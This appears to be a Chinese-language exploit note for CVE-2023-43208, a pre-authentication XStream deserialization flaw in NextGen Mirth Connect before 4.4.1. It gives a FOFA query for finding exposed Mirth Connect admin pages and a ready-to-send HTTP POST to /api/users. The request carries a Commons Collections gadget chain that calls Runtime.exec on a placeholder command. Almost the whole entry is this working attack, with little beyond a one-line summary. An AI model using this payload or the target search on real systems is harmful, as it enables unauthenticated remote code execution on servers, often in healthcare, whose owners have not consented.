## NextGen-Mirth-Connect-XStream反序列化远程代码执行漏洞(CVE-2023-43208)

NextGen Mirth Connect 4.4.1之前版本存在远程代码执行漏洞，未经身份认证的攻击者可利用该漏洞远程执行代码。

## fofa

```
title="Mirth Connect Administrator"
```

## poc

```
POST /api/users HTTP/1.1
Host: 
X-Requested-With: OpenAPI
Content-Type: application/xml
 
<sorted-set>
    <string>abcd</string>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
              <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                  <org.apache.commons.collections4.functors.ConstantTransformer>
                    <iConstant class="java-class">java.lang.Runtime</iConstant>
                  </org.apache.commons.collections4.functors.ConstantTransformer>
                  <org.apache.commons.collections4.functors.InvokerTransformer>
                    <iMethodName>getMethod</iMethodName>
                    <iParamTypes>
                      <java-class>java.lang.String</java-class>
                      <java-class>[Ljava.lang.Class;</java-class>
                    </iParamTypes>
                    <iArgs>
                      <string>getRuntime</string>
                      <java-class-array/>
                    </iArgs>
                  </org.apache.commons.collections4.functors.InvokerTransformer>
                  <org.apache.commons.collections4.functors.InvokerTransformer>
                    <iMethodName>invoke</iMethodName>
                    <iParamTypes>
                      <java-class>java.lang.Object</java-class>
                      <java-class>[Ljava.lang.Object;</java-class>
                    </iParamTypes>
                    <iArgs>
                      <null/>
                      <object-array/>
                    </iArgs>
                  </org.apache.commons.collections4.functors.InvokerTransformer>
                  <org.apache.commons.collections4.functors.InvokerTransformer>
                    <iMethodName>exec</iMethodName>
                    <iParamTypes>
                      <java-class>java.lang.String</java-class>
                    </iParamTypes>
                    <iArgs>
                      <string>执行的命令</string>
                    </iArgs>
                  </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
              </target>
              <methodName>transform</methodName>
              <eventTypes>
                <string>compareTo</string>
              </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

